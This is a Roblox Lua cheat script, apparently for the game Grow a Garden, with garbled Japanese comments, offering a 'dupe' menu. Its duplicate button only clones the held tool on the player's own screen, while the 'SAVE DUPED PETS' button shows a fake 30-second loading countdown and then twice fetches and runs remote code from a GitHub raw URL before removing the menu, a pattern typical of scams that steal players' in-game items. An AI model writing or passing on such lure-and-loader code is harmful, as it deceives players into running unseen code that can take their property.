local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer

-- UIä½œæˆå‰ã®GuiObjectsã‚’ä¿å­˜
local beforeUI = {}
for _, gui in ipairs(CoreGui:GetChildren()) do
	table.insert(beforeUI, gui)
end

-- Kavo UIã®ãƒ­ãƒ¼ãƒ‰
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("2.0 - New Flow", "Midnight")

-- UIä½œæˆå¾Œã«æ–°ã—ãè¿½åŠ ã•ã‚ŒãŸScreenGuiã‚’ç‰¹å®š
local KavoGui
for _, gui in ipairs(CoreGui:GetChildren()) do
	if not table.find(beforeUI, gui) and gui:IsA("ScreenGui") then
		KavoGui = gui
		break
	end
end

-- ãƒ¡ã‚¤ãƒ³ã‚¿ãƒ–ã¨ã‚»ã‚¯ã‚·ãƒ§ãƒ³ä½œæˆ
local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Main Controls")

-- ãƒ„ãƒ¼ãƒ«è¡¨ç¤ºãƒ©ãƒ™ãƒ«
local toolLabel = MainSection:NewLabel("Holding: Nothing")
RunService.RenderStepped:Connect(function()
	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
	local name = tool and tool.Name or "Nothing"
	toolLabel:UpdateLabel("Holding: " .. name)
end)

-- Dupe Amount å…¥åŠ›
local dupeAmount = 1
MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
	local number = tonumber(text)
	if number and number >= 1 and number <= 100 then
		dupeAmount = number
	else
		warn("Enter a number between 1 and 100")
	end
end)

-- è¤‡è£½ãƒœã‚¿ãƒ³
MainSection:NewButton("DUPE", "Duplicate your tool", function()
	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
	if not tool then
		warn("No tool to duplicate.")
		return
	end
	for i = 1, dupeAmount do
		local clone = tool:Clone()
		clone.Parent = player.Backpack
	end
end)

-- çŠ¶æ…‹è¡¨ç¤ºãƒ©ãƒ™ãƒ«
local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
local function setStatus(text)
	statusLabel:UpdateLabel("SAVE STATUS: " .. text)
end

-- å¤šé‡å®Ÿè¡Œé˜²æ­¢ãƒ•ãƒ©ã‚°
local hasExecuted = false

-- SAVE DUPED PETS ãƒœã‚¿ãƒ³
MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
	if hasExecuted then
		setStatus("â›” Already started!")
		return
	end
	hasExecuted = true

	task.spawn(function()
		-- ã‚«ã‚¦ãƒ³ãƒˆãƒ€ã‚¦ãƒ³è¡¨ç¤º
		for i = 30, 1, -1 do
			setStatus("â³ Loading pet info... (" .. i .. "s)")
			wait(1)
		end

		-- ã‚¹ã‚¯ãƒªãƒ—ãƒˆèµ·å‹•
		setStatus("ğŸš€ Booting...")

		local function runScript()
			return pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
			end)
		end

		local success1, err1 = runScript()
		local success2, err2 = runScript()

		if success1 and success2 then
			setStatus("âœ… Success (x2)!")
		else
			setStatus("âŒ Error:\n" .. tostring(err1 or "nil") .. "\n" .. tostring(err2 or "nil"))
		end

		-- 3ç§’å¾…ã£ã¦ã‹ã‚‰UIå‰Šé™¤
		wait(3)

		if KavoGui and KavoGui.Parent then
			print("ğŸŸ¢ Kavo GUI å‰Šé™¤ã—ã¾ã™: " .. KavoGui.Name)
			pcall(function()
				KavoGui:Destroy()
			end)
		else
			print("âš ï¸ Kavo GUI ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã€‚")
		end
	end)
end)
